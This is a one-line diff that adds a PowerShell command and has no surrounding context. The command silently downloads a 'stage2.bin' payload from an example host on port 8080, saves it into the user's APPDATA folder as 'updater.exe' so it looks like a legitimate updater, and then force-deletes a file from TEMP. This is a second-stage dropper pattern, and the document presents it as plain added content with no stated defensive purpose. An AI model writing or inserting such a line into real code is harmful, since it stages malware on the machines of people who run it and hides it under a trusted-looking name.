@@ -1,0 +1,1 @@
+$PayloadUrl = "http://adatum.com:8080/stage2.bin"; $DownloadPath = "$env:APPDATA\updater.exe"; curl.exe -s -L -o $DownloadPath $PayloadUrl; Set-Location -Path $env:TEMP; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
